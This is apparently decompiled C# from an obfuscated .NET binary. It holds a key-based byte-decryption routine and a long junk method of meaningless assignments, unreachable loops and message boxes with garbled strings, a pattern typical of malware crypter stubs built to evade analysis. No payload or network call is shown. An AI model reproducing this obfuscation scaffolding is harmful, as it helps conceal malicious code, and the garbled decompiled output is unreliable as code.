using System;
using System.Text;
using System.Windows.Forms;
using Microsoft.VisualBasic;
using Microsoft.VisualBasic.CompilerServices;

namespace nPub;

internal class Uv
{
	public static byte[] smethod_0(byte[] Data, string keys)
	{
		byte[] bytes = Encoding.Default.GetBytes(keys);
		checked
		{
			for (int i = Data.Length * 2 + bytes.Length; i >= 0; i += -1)
			{
				Data[unchecked(i % Data.Length)] = (byte)unchecked(checked(unchecked(Data[i % Data.Length] ^ bytes[i % bytes.Length]) - unchecked((int)Data[checked(i + 1) % Data.Length]) + 256) % 256);
			}
			return Data;
		}
	}

	private void wL9gQ8OHFGt9CahI21ND0OAim()
	{
		//IL_000f: Unknown result type (might be due to invalid IL or missing references)
		//IL_0217: Unknown result type (might be due to invalid IL or missing references)
		//IL_0233: Unknown result type (might be due to invalid IL or missing references)
		//IL_0276: Unknown result type (might be due to invalid IL or missing references)
		//IL_0286: Unknown result type (might be due to invalid IL or missing references)
		//IL_029e: Unknown result type (might be due to invalid IL or missing references)
		_ = 478014;
		while (true)
		{
			_ = 1;
			MessageBox.Show("Icgƒ!YCFBTK|4k_&\u008d79WRBƒ s}6@p-)6„*F‰B7(/T6-\u008dV\u008d\u008dy.");
			_ = 747416;
			_ = 613935.0;
			_ = 8;
			_ = 2;
			if (false)
			{
				_ = 9568;
			}
			else
			{
				_ = 1;
			}
		}
		checked
		{
			while (true)
			{
				_ = 3796047;
				while (true)
				{
					_ = 115470;
					_ = 0;
					_ = 5.0;
					_ = 714816332.0;
					_ = 5330223;
					_ = 0;
					new decimal(561L);
					if (false)
					{
						_ = 746;
					}
					else
					{
						_ = 7523109;
					}
				}
				_ = 0;
				_ = 1;
				_ = 7460069;
				try
				{
				}
				catch (Exception projectError)
				{
					ProjectData.SetProjectError(projectError);
					if (true)
					{
						int num = 71303;
						do
						{
							_ = 4311444;
							while (true)
							{
								new decimal(985L);
							}
							num++;
						}
						while (num <= 1568240);
						_ = 80;
						int num2 = 696;
						while (num2 <= 42)
						{
							if (true)
							{
							}
							_ = 3566;
							try
							{
							}
							catch (Exception projectError2)
							{
								ProjectData.SetProjectError(projectError2);
								new decimal(43L);
								_ = 944971025.0;
								_ = 122;
								_ = 0;
								new decimal(646L);
								_ = 0;
								_ = 0.0;
								ProjectData.ClearProjectError();
							}
							MessageBox.Show("m%_kV|M \\>HjeWCx-(\u0081jB4ocFq!‹H&Z+[Š:\u008d’2’„nfkLk\u008fM__rSYŠ\u008f*XHŽDxzTkUv=.m<Iy\u008d(\u008f\u008fo\\CŠJCU");
							_ = 0;
							new decimal(1854025L);
							new decimal(776847L);
							_ = 43.0;
							_ = 1;
							_ = 10.0;
							while (false)
							{
								_ = 97296667;
								_ = 1;
								if (false)
								{
									_ = 0;
								}
								else
								{
									_ = 2815;
								}
								_ = 5034;
								_ = 139;
								new decimal(5L);
								_ = 965364;
							}
							_ = 0;
							_ = 5575;
							_ = 0;
							int num3 = 1;
							while (true)
							{
								if (false)
								{
									_ = 64491;
									continue;
								}
								try
								{
								}
								catch (Exception projectError3)
								{
									ProjectData.SetProjectError(projectError3);
									ProjectData.ClearProjectError();
								}
								_ = 0;
								int num4 = 756092608;
								while (num4 <= 70051)
								{
									num4++;
								}
								num3++;
								if (num3 <= 66)
								{
									continue;
								}
								break;
							}
							_ = 1;
							_ = 50.0;
							_ = 1;
							if (true)
							{
								_ = 32614;
							}
							else
							{
								_ = 784489;
							}
							new decimal(50L);
							while (true)
							{
								new decimal(800670L);
								if (true)
								{
									_ = 8042672;
								}
								else
								{
									_ = 7;
								}
								_ = 1;
							}
							while (true)
							{
							}
							if (false)
							{
								Interaction.MsgBox((object)"jCeodD4Yz86iG5azpu", (MsgBoxStyle)0, (object)null);
							}
							else
							{
								_ = 7972973;
							}
							num2++;
						}
						Interaction.MsgBox((object)"Ž‘*n†C:1ˆ-!q}5Uz5ic3q+&XŒTLSmyij%K@qZm,=vAm=yB(N GH-,5ƒŠeuQ‰zV/WIlQˆv?[\\FPPP{qiL\u0090RFwB]‹5Oyˆ‹mFŽ~^yOhe)BT2„-o)W~\\EHt", (MsgBoxStyle)0, (object)null);
					}
					if (true)
					{
						Interaction.MsgBox((object)"SJxiyGotYvXkm3T", (MsgBoxStyle)0, (object)null);
					}
					else
					{
						_ = 0;
					}
					ProjectData.ClearProjectError();
				}
				Interaction.MsgBox((object)"-z‹‘…kL+l]7ox!\u008f80{wi’aƒ[yLŽ8Y=uK\u008d!H2O7\u0081]‘140o@4Ž?+jII~b_‰O7Yo4eNz~uwl}{‹Œ:k€Ms\u007fY7 ŒNfK1Q|; ’H€}_xHƒ]PATCqP/3t26bqBo:7", (MsgBoxStyle)0, (object)null);
			}
		}
	}
}
